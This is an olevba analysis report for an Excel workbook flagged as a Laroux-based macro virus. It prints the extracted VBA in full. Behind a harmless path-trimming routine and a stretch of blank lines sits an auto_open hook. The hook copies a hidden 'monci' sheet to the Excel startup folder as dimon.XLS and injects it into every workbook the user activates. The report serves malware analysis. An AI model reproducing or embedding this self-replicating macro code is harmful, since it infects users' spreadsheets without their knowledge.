olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Laroux-based-624a855127f204b9bc307b5200a8dd6fe053eaf4
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO monci.bas 
in file: Virus.MSExcel.Laroux-based-624a855127f204b9bc307b5200a8dd6fe053eaf4 - OLE stream: '_VBA_PROJECT_CUR/VBA/monci'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub RemoveDirPath()
    Dim strTemp As String
    Dim obj
    Dim iPos As Integer
    Dim icount As Integer
    
    objSelect = Application.Selection
    icount = 1
    For Each obj In objSelect
        iPos = 0
        strTemp = CStr(obj)
        iPos = InStr(strTemp, "\")
        If iPos <> 0 Then
            strTemp = Right(strTemp, Len(strTemp) - iPos)
            iPos = InStr(strTemp, "\")
            If iPos <> 0 Then
                strTemp = Right(strTemp, Len(strTemp) - iPos)
            End If
        End If
        objSelect(icount, 1) = strTemp
        icount = icount + 1
    Next
    Application.Selection = objSelect
End Sub














Sub auto_open()
Attribute auto_open.VB_ProcData.VB_Invoke_Func = " \n14"
    Application.OnSheetActivate = "vrs"
End Sub

Sub vrs()
Attribute vrs.VB_ProcData.VB_Invoke_Func = " \n14"
    c$ = Application.StartupPath
    m$ = Dir(c$ & "\" & "dimon.XLS")
    If m$ = "dimon.XLS" Then p = 1 Else p = 0
    If ActiveWorkbook.Modules.Count > 0 Then w = 1 Else w = 0
    whichfile = p + w * 10
    
Select Case whichfile
    Case 10
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    Sheets("monci").Visible = True
    Sheets("monci").Select
    Sheets("monci").Copy
    With ActiveWorkbook
        .title = ""
        .Subject = ""
        .Author = ""
        .Keywords = ""
        .Comments = ""
    End With
    newname$ = ActiveWorkbook.Name
    c4$ = CurDir()
    ChDir Application.StartupPath
    ActiveWindow.Visible = False
    Workbooks(newname$).SaveAs FileName:=Application.StartupPath & "/" & "dimon.XLS", FileFormat:=xlNormal _
        , Password:="", WriteResPassword:="", ReadOnlyRecommended:= _
        False, CreateBackup:=False
    ChDir c4$
    Workbooks(n4$).Sheets("monci").Visible = False
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "dimon.xls!vrs"
    Case 1
    Application.ScreenUpdating = False
    n4$ = ActiveWorkbook.Name
    p4$ = ActiveWorkbook.Path
    s$ = Workbooks(n4$).Sheets(1).Name
    If s$ <> "monci" Then
        Workbooks("dimon.XLS").Sheets("monci").Copy before:=Workbooks(n4$).Sheets(1)
        Workbooks(n4$).Sheets("monci").Visible = False
    Else
    End If
    Application.OnSheetActivate = ""
    Application.ScreenUpdating = True
    Application.OnSheetActivate = "dimon.xls!vrs"
    Case 11
    Dim msg, style, title, Respon
    t$ = Time()
Rem     If t$ > "21:00:00" Then
Rem     msg = "Maaf, Sekarang Waktunya Untuk Berisitrahat"
Rem     style = vbOKOnly
Rem     title = "WARNING !!!"
Rem     Respon = MsgBox(msg, style, title)
Rem     If Respon = vbOK Then
Rem     Application.Quit
Rem     End If
Rem     Else
Rem     End If
    Case Else
End Select
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     13 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  monc
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Foglio
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
+----------+--------------------+---------------------------------------------+

